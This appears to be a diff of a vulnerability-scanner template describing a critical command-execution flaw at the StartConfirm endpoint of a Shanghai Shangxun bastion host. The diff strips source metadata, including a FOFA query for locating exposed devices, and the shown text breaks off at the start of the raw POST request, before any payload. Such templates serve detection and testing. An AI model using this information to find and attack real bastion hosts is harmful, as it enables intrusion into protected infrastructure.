@@ -3,12 +3,8 @@ info:
   name: 上海上讯信息技术股份有限公司 堡垒机 StartConfirm 命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zorydt9hrre3t1p3'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zorydt9hrre3t1p3
-    fofa: body="default/getloginhtml"
 http:
 - raw:
   - 'POST /default/StartConfirm/ HTTP/1.1
